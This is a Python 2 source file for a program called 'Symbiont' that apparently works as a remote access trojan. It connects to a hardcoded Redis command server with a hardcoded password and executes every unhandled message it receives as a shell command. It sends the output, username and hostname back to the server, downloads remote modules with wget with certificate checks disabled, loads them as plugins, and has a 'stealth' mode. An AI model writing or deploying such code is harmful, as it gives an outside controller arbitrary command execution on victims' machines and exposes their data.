import logging
from time import sleep
import redis
import socket
import getpass
import datetime
import inspect
from datetime import timedelta
from subprocess import *
import os
import imp
import sys

import logging
import time

logging.basicConfig(format='[%(asctime)s] %(levelname)s:\t\t%(message)s', filename='symbiont.log', level=logging.DEBUG,
    datefmt='%d.%m %H:%M:%S')
logging.info('======')

import threading

try:
    import json
except:
    import simplejson as json


ONLINE_DELAY = 1



class Symbiont(object):
    def __init__(self, alias):
        self.alias = alias
        self.username = getpass.getuser()

        self.connection = redis.Redis('averr.in', password="aqwersdf")
        stream = self.connection.pubsub()
        stream.subscribe('commands:all')
        stream.subscribe('commands:%s' % self.alias)

        self.plugins = []

        self.stream = stream
        self.stop = False
        self.stealth = False
        self.state = 'online'

        self.reloadPlugins()


        t1 = threading.Thread(target=self.listener)
        t1.daemon = True
        t2 = threading.Thread(target=self.main)
        t2.daemon = True

        self.lt = t1
        self.ot = t2

        # start threads
        t1.start()
        t2.start()

    def online(self, msg):
        channel = "online"
        data = self.format(msg)
        self.connection.publish(channel, data)
    
    def say(self, msg, channel=None):
        if channel is None:
            channel = "answer:%s" % self.alias
        
        self.connection.publish(channel, self.format(msg))

    def abort(self):
        self.stop = True
        self.stream.reset()

    def reloadPlugins(self):
        self.plugins = []
        if os.path.isdir(os.path.expanduser('~/.symbiont')):
            self.loader = Loader(parent=self, match_cls=None, path=os.path.expanduser('~/.symbiont'))
            self.plugins = self.loader.modules
        logging.info(self.plugins)

    def listener(self):

        try:
            for data_raw in self.stream.listen():
                logging.info(data_raw)
                if data_raw['type'] not in ['message', 'pmessage']:
                    continue
                try:
                    data = json.loads(data_raw['data'])
                except:
                    data = data_raw['data']

                if data == 'sym:stop':
                    self.abort()
                elif data == 'sym:stealth':
                    self.stealth = not self.stealth
                elif data == 'sym:reload':
                    self.reloadPlugins()
                elif data.startswith('sym#add_module#'):
                    cmd = "wget %s -O %s --no-check-certificate" % (data.split('#')[2], os.path.join(os.path.expanduser('~'), '.symbiont', data.split('#')[3]))
                    self.execCmd(cmd)
                    self.reloadPlugins()
                else:
                    handled = False
                    for handler in self.plugins:
                        if hasattr(handler, 'processCmd'):
                            try:
                                handled = handler.processCmd(data_raw['channel'], data)
                            except Exception, e:
                                logging.error(e)
                    if not handled:
                        self.execCmd(data)
        except Exception, e:
            logging.error(e)
            exit()

    def execCmd(self, data):
        try:
            p = Popen(data.split(' '), stderr=PIPE, stdout=PIPE)
            self.state = 'busy'
            p = p.communicate()
            if p[0]:
                logging.info(p[0])
            else:
                logging.info(p)

            try:
                p = [p[0].decode('utf8'), p[1].decode('utf8')]
            except:
                p = [p[0].decode('cp1251'), p[1].decode('cp1251')]
            self.state = 'online'
            self.say(p)
        except Exception, e:
            logging.error(e)
#            raise e


    def main(self):
        now = datetime.datetime.now()
        while not self.stop:
            if not self.stealth:
                d = datetime.datetime.now() - now
                if d > timedelta(seconds=ONLINE_DELAY):
                    now = datetime.datetime.now()
                    self.online(self.state)
            try:
                sleep(0.5)
            except KeyboardInterrupt:
                self.stop = True
        self.stream.reset()


    def format(self, data):

        data = {
            'msg': data,
            'time': str(datetime.datetime.now()),
            'username': self.username,
            'hostname': self.alias,
        }

        return json.dumps(data)


class Loader(object):
    def __init__(self, parent, match_cls=None, path=''):
        self.match_cls = match_cls
        self.path = path
        self.modules = []
        self.parent = parent
        _modules = [self.load_module(name) for name in self.find_modules()]

        for module in _modules:
            for obj in module.__dict__.values():
                if self.match_cls is not None:
                    if issubclass(obj, self.match_cls):
                        self.modules.append(obj(self.parent))
                else:
                    try:
                        obj = obj(self.parent)
                        if hasattr(obj, 'processCmd'):
                            self.modules.append(obj)
                    except Exception, e:
                        pass


    def find_modules(self):
        modules = set()
        for filename in os.listdir(self.path):
            module = None
            if filename not in ['base.py']:
                if filename.endswith(".py"):
                    module = filename[:-3]
                elif filename.endswith(".pyc"):
                    module = filename[:-4]
                if module is not None:
                    modules.add(module)
        return list(modules)

    def load_module(self, name):
        (file, pathname, description) = imp.find_module(name, [self.path])
        return imp.load_module(name, file, pathname, description)

def main(args):
    
    alias = args[1]
    globals()['alias'] = alias

    s = Symbiont(alias)
    while s.lt.is_alive and s.ot.is_alive():
        try:
            s.lt.join(1)
            s.ot.join(1)
        except KeyboardInterrupt:
            print "Ctrl-c received! Sending kill to threads..."
            s.stop = True

if __name__ == '__main__':
    main(sys.argv)
